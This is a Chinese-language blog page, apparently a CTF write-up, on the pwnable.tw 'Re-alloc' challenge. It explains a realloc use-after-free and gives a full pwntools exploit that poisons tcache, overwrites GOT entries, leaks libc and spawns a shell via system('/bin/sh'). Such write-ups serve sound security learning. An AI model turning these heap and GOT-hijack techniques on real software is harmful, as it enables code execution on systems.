@@ -1,0 +1,230 @@
+<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>【pwnable.tw】Re-alloc writeup | Cameudis's Blog</title><meta name="author" content="Cameudis"><meta name="copyright" content="Cameudis"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="相关：realloc、tcache2.29 借用了很多巧合，实在是特别“幸运”的一个利用。自己做出来之后，发现网上大部分wp都和我的解法不一样，但是更通用一些，不像我的那么极限（草）。 漏洞分析保护情况： 123456Arch:     amd64-64-littleRELRO:    Partial RELROStack:    Canary foundNX:       NX enabledP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【pwnable.tw】Re-alloc writeup">
+<meta property="og:url" content="https://cameudis.github.io/Tech/Pwn/f6c454d44380.html">
+<meta property="og:site_name" content="Cameudis&#39;s Blog">
+<meta property="og:description" content="相关：realloc、tcache2.29 借用了很多巧合，实在是特别“幸运”的一个利用。自己做出来之后，发现网上大部分wp都和我的解法不一样，但是更通用一些，不像我的那么极限（草）。 漏洞分析保护情况： 123456Arch:     amd64-64-littleRELRO:    Partial RELROStack:    Canary foundNX:       NX enabledP">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.imgtg.com/2023/04/11/8z0Vl.png">
+<meta property="article:published_time" content="2023-04-13T15:03:41.000Z">
+<meta property="article:modified_time" content="2023-04-13T15:04:28.133Z">
+<meta property="article:author" content="Cameudis">
+<meta property="article:tag" content="pwnable.tw">
+<meta property="article:tag" content="heap">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.imgtg.com/2023/04/11/8z0Vl.png"><link rel="shortcut icon" href="/icon_blackhole.png"><link rel="canonical" href="https://cameudis.github.io/Tech/Pwn/f6c454d44380.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: true,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  }
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '【pwnable.tw】Re-alloc writeup',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-04-13 23:04:28'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = url => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      link.onload = () => resolve()
+      link.onerror = () => reject()
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/images/ava1.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">48</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">20</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">9</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="Cameudis's Blog"><span class="site-name">Cameudis's Blog</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">【pwnable.tw】Re-alloc writeup</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2023-04-13T15:03:41.000Z" title="Created 2023-04-13 23:03:41">2023-04-13</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2023-04-13T15:04:28.133Z" title="Updated 2023-04-13 23:04:28">2023-04-13</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Tech/">Tech</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Tech/Pwn/">Pwn</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="leancloud_visitors" id="/Tech/Pwn/f6c454d44380.html" data-flag-title="【pwnable.tw】Re-alloc writeup"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span class="leancloud-visitors-count"><i class="fa-solid fa-spinner fa-spin"></i></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">Comments:</span><a href="/Tech/Pwn/f6c454d44380.html#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/Tech/Pwn/f6c454d44380.html" itemprop="commentCount"><i class="fa-solid fa-spinner fa-spin"></i></span></a></span></div></div></div><article class="post-content" id="article-container"><p>相关：realloc、tcache2.29</p>
+<p>借用了很多巧合，实在是特别“幸运”的一个利用。<br>自己做出来之后，发现网上大部分wp都和我的解法不一样，但是更通用一些，不像我的那么极限（草）。</p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>保护情况：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x3fe000)</span><br><span class="line">FORTIFY:  Enabled</span><br></pre></td></tr></table></figure>
+
+<p>程序是一个菜单，提供了alloc、realloc、free功能，来操作bss段的两个栏位，大致功能如下：</p>
+<ul>
+<li>alloc：选中栏当前为NULL时，使用 realloc(NULL, size) 分配新的区块并读入数据；</li>
+<li>realloc：选中栏当前非NULL时，将选中栏使用 realloc(ptr, size) 来调整大小并（如果realloc返回值非0）读入数据；</li>
+<li>free：将选中栏使用 realloc(ptr, 0) 进行释放，并<strong>将指针置零</strong>。</li>
+</ul>
+<p>主要的漏洞在于realloc的使用上，可以通过RTFM（在线man地址：<a target="_blank" rel="noopener" href="https://linux.die.net/man/3/realloc">realloc(3): allocate&#x2F;free dynamic memory - Linux man page</a>）得到realloc的说明：</p>
+<blockquote>
+<p>The <strong>realloc</strong>() function changes the size of the memory block pointed to by <em>ptr</em> to <em>size</em> bytes. The contents will be unchanged in the range from the start of the region up to the minimum of the old and new sizes. If the new size is larger than the old size, the added memory will <em>not</em> be initialized. If <em>ptr</em> is NULL, then the call is equivalent to <em>malloc(size)</em>, for all values of <em>size</em>; if <em>size</em> is equal to zero, and <em>ptr</em> is not NULL, then the call is equivalent to <em>free(ptr)</em>. Unless <em>ptr</em> is NULL, it must have been returned by an earlier call to <strong>malloc</strong>(), <strong>calloc</strong>() or <strong>realloc</strong>(). If the area pointed to was moved, a <em>free(ptr)</em> is done.</p>
+</blockquote>
+<p>注意到，当ptr字段为0，realloc等价于malloc；当ptr不为0但size为0时，realloc等价于free。</p>
+<p>程序确实使用这两种功能来实现了malloc以及free，但是在realloc和free功能中，检查做得不够完善：</p>
+<ul>
+<li>当realloc中输入size为0，可以<strong>触发free，且不将原指针置零</strong>，创造了UAF的可能。</li>
+<li>使用free作用于空栏位（NULL），可以触发一次匿名的malloc(0)。这里的匿名指的是结果不会保存在bss段结构中，因为free会将其置零。</li>
+</ul>
+<p>其实另外还在alloc功能中发现了一个Off-by-NULL漏洞，但我并没有想到很好的办法来用到这个漏洞。</p>
+<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>在宏观的层面上，由于程序二进制本身虽然关闭了PIE，但没有特别有用的函数，因此思路还是两步走：泄露libc地址、劫持控制流。</p>
+<h3 id="泄露libc地址"><a href="#泄露libc地址" class="headerlink" title="泄露libc地址"></a>泄露libc地址</h3><p>程序本身并没有能够提供打印区块数据的功能，因此想要泄露libc数据就一定需要劫持控制流。<br>目前，栈地址未知排除ROP，将目标瞄准GOT：</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">off_404018 dq offset _exit  </span><br><span class="line">off_404020 dq offset __read_chk</span><br><span class="line">off_404028 dq offset puts</span><br><span class="line">off_404030 dq offset __stack_chk_fail</span><br><span class="line">off_404038 dq offset printf</span><br><span class="line">off_404040 dq offset alarm</span><br><span class="line">off_404048 dq offset atoll</span><br><span class="line">off_404050 dq offset signal</span><br><span class="line">off_404058 dq offset realloc</span><br><span class="line">off_404060 dq offset setvbuf</span><br><span class="line">off_404068 dq offset __isoc99_scanf</span><br></pre></td></tr></table></figure>
+
+<p>首先思考可不可以把唯一操作区块的外部函数——realloc替换为puts来泄露地址，笔者这时顾忌到题目限制了区块大小，不太方便构造 unsorted bin 中的区块。<br>因此将目标瞄准了atoll，这个函数在read_long中被调用，参数是栈上用来读入数字的buffer。可以尝试用它来泄露栈上的数据。</p>
+<p>这时一个好主意是使用plt[printf]代替atoll，这样就可以在栈上指哪打哪，可惜笔者做的时候并没有想到这个好主意，只是用了plt[puts]。不过不影响，因为我遇到了第一个逆天的巧合：<strong>在buffer+8的位置就有一个libc地址</strong>。先介绍一下怎么覆写的：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">alloc(<span class="number">0</span>, <span class="number">0x18</span>, <span class="string">b&quot;victim&quot;</span>)</span><br><span class="line">realloc_free(<span class="number">0</span>)</span><br><span class="line">realloc(<span class="number">0</span>, <span class="number">0x18</span>, pack(elf.got[<span class="string">&quot;atoll&quot;</span>]))</span><br><span class="line">free(<span class="number">1</span>)     <span class="comment"># alloc a anonymous 0x20 chunk</span></span><br><span class="line">alloc(<span class="number">1</span>, <span class="number">0x18</span>, pack(elf.plt[<span class="string">&quot;puts&quot;</span>])+pack(<span class="number">0</span>)+pack(<span class="number">0x4015DC</span>))</span><br></pre></td></tr></table></figure>
+
+<p>第一行创建了一个0x20大小区块，第二行将其释放进入tcache，同时保留了这个指针。<br>第三行使用了realloc，realloc发现这个区块大小正常就直接放行了，从而我们可以覆盖fd指针为got[atoll]。<br>第四行使用free的漏洞来申请一个匿名区块，分配完之后再下一个区块就是atoll了。<br>第五行将atoll覆盖为plt[puts]，并顺便把realloc覆盖为一个普通 <code>ret</code> 的地址，原因后面再说。</p>
+<p><em>这里需要提一嘴，我使用了匿名区块来解决这一问题：非0的栏位无法进行alloc。不过在复盘时，从网上的大佬那边发现可以通过一种非常巧妙的方式来将栏位置零，同时又不干扰已经位于tcache中的atoll地址，从而将后续利用流程也变得直观一些。<br>可以通过realloc将区块变大，然后再free。这样就可以free到别的大小的tcache中，并且根本不用关注key的检查，也不会将atoll的地址覆盖，一举两得。<br>参考地址见<a target="_blank" rel="noopener" href="https://www.taintedbits.com/2020/07/05/binary-exploitation-pwnable-tw-realloc/">Binary Exploitation [pwnable.tw] - Realloc - Tainted Bits</a></em></p>
+<p>接下来泄露libc地址，由于buffer+8就有，因此简简单单就可以泄露了：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">io.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Index:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;1111111\n&quot;</span>)   <span class="comment"># just padding</span></span><br><span class="line">io.recvuntil(<span class="string">b&quot;1111111\n&quot;</span>)</span><br><span class="line">libc_base = unpack(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)+<span class="string">b&#x27;\0\0&#x27;</span>)-<span class="number">0x1e570a</span></span><br><span class="line">success(<span class="string">&quot;libc_base: &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br></pre></td></tr></table></figure>
+
+<h3 id="攻击！"><a href="#攻击！" class="headerlink" title="攻击！"></a>攻击！</h3><p>目标是 get shell，由于之前已经有了指向GOT的指针（栏位1中），所以我们想办法利用realloc中最后的那个read_input函数来再次修改GOT。<br>但由于realloc在中间会调用realloc（废话），直接让他realloc一个GOT中的区块大概率是要出问题的，而且程序会往realloc的返回值中读入数据。因此我们需要想一个办法让realloc调用返回之后，rax是GOT中区块的地址。</p>
+<p>静态分析一波，并没有发现什么 <code>mov rax, rdi; ret;</code> 的gadget，难道我的方法走不下去了吗？于是动态分析一波，惊喜地发现 <strong>程序在调用realloc之前，rax中就已经是GOT中区块地地址了</strong>，令人不得不感叹 <del>大自然</del> 出题人的鬼斧神工。</p>
+<p>所以就有了上面把realloc覆盖为一个简单的 <code>ret</code> 。这样一来，在执行了下面几句代码后，atoll就会变成system的地址（<strong>注意注释</strong>，很重要）：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">io.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Index:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;\0&#x27;</span>)          <span class="comment"># now atoll is puts, so puts(&quot;\0&quot;) = 1</span></span><br><span class="line">io.recvuntil(<span class="string">b&quot;Size:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;1111111\0&quot;</span>)   <span class="comment"># now atoll is puts, so puts(&quot;1111111\0&quot;) = 8</span></span><br><span class="line"><span class="comment"># we have hijacked realloc to &#x27;ret&#x27;, and when call realloc, rax has been same as rdi (which is really coincident)</span></span><br><span class="line"><span class="comment"># so program just pass and execute read_input(heap[v1], size)</span></span><br><span class="line">io.sendline(pack(libc_base+libc.symbols[<span class="string">&quot;system&quot;</span>]))</span><br></pre></td></tr></table></figure>
+
+<p>最后，我们随便触发一个read_long，输入&#x2F;bin&#x2F;sh，就可以成功 get shell！当然，也可以直接输入 <code>cat ~/flag</code>，如果您需要节省时间的话。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">io.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Index:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;/bin/sh\0&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="完整脚本"><a href="#完整脚本" class="headerlink" title="完整脚本"></a>完整脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params"><span class="built_in">id</span>, size, data</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Index:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>).encode(<span class="string">&quot;ascii&quot;</span>))</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Size:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size).encode(<span class="string">&quot;ascii&quot;</span>))</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Data:&quot;</span>)</span><br><span class="line">    io.send(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">realloc</span>(<span class="params"><span class="built_in">id</span>, size, data</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Index:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>).encode(<span class="string">&quot;ascii&quot;</span>))</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Size:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size).encode(<span class="string">&quot;ascii&quot;</span>))</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Data:&quot;</span>)</span><br><span class="line">    io.send(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">realloc_free</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Index:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>).encode(<span class="string">&quot;ascii&quot;</span>))</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Size:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;0&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Index:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>).encode(<span class="string">&quot;ascii&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ---------- leak libc ----------</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 1.1 hijack GOT[atoll] to PLT[puts], GOT[realloc] to &#x27;ret&#x27;</span></span><br><span class="line"></span><br><span class="line">    alloc(<span class="number">0</span>, <span class="number">0x18</span>, <span class="string">b&quot;victim&quot;</span>)</span><br><span class="line">    realloc_free(<span class="number">0</span>)</span><br><span class="line">    realloc(<span class="number">0</span>, <span class="number">0x18</span>, pack(elf.got[<span class="string">&quot;atoll&quot;</span>]))</span><br><span class="line">    free(<span class="number">1</span>)     <span class="comment"># alloc a anonymous 0x20 chunk</span></span><br><span class="line">    alloc(<span class="number">1</span>, <span class="number">0x18</span>, pack(elf.plt[<span class="string">&quot;puts&quot;</span>])+pack(<span class="number">0</span>)+pack(<span class="number">0x4015DC</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 1.2 leak libc load address (from stack)</span></span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Index:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;1111111\n&quot;</span>)   <span class="comment"># just padding</span></span><br><span class="line">    io.recvuntil(<span class="string">b&quot;1111111\n&quot;</span>)</span><br><span class="line">    libc_base = unpack(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)+<span class="string">b&#x27;\0\0&#x27;</span>)-<span class="number">0x1e570a</span></span><br><span class="line">    success(<span class="string">&quot;libc_base: &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ---------- hijack GOT ----------</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2.1 hijack GOT[atoi] to libc[system]</span></span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Index:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;\0&#x27;</span>)          <span class="comment"># now atoll is puts, so puts(&quot;\0&quot;) = 1</span></span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Size:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;1111111\0&quot;</span>)   <span class="comment"># now atoll is puts, so puts(&quot;1111111\0&quot;) = 8</span></span><br><span class="line">    <span class="comment"># we have hijacked realloc to &#x27;ret&#x27;, and when call realloc, rax has been same as rdi (which is really coincident)</span></span><br><span class="line">    <span class="comment"># so program just pass and execute read_input(heap[v1], size)</span></span><br><span class="line">    io.sendline(pack(libc_base+libc.symbols[<span class="string">&quot;system&quot;</span>]))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2.2 trigger system(&quot;/bin/sh&quot;) by atoi(&quot;/bin/sh&quot;)</span></span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Index:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;/bin/sh\0&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    success(<span class="string">&quot;Enjoy your shell!&quot;</span>)</span><br><span class="line">    io.interactive()</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
+
+<p>这个故事告诉我们：涉及内存安全的函数还是要小心小心再小心，仔细阅读手册、了解边界行为……</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="https://cameudis.github.io">Cameudis</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://cameudis.github.io/Tech/Pwn/f6c454d44380.html">https://cameudis.github.io/Tech/Pwn/f6c454d44380.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/pwnable-tw/">pwnable.tw</a><a class="post-meta__tags" href="/tags/heap/">heap</a></div><div class="post_share"><div class="social-share" data-image="https://i.imgtg.com/2023/04/11/8z0Vl.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script 